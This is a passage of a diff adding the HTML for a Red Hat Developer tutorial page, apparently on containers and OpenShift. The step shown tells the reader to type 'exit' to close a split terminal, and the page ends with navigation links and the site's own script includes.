+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[%USER%@ansible-1 ~]$</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>And now exit out of that terminal</p>
+</div>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">exit</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Which should return you terminal to a single "unsplit" terminal window</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="_images/terminal-unsplit.jpg" alt="terminal unsplit">
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<nav class="pagination">
+  <span class="prev"><a href="../deploy-container.html" class="query-params-link">Deploying to OpenShift</a></span>
+  <span class="next"><a href="../DATABASES/databases-and-containers.html" class="query-params-link">Containerized Databases</a></span>
+</nav>
+</article>
+<aside class="toc sidebar" data-title="Contents" data-levels="2">
+  <div class="toc-menu"></div>
+</aside>
+  </div>
+</main>
+</div>
+<footer class="footer">
+  <a class="rhd-logo" href="https://developers.redhat.com" target="_blank"></div>
+</footer>
+<script src="../../../_/js/vendor/clipboard.js"></script>
+<script src="../../../_/js/site.js"></script>
+<script async src="../../../_/js/vendor/highlight.js"></script>  </body>
+</html>
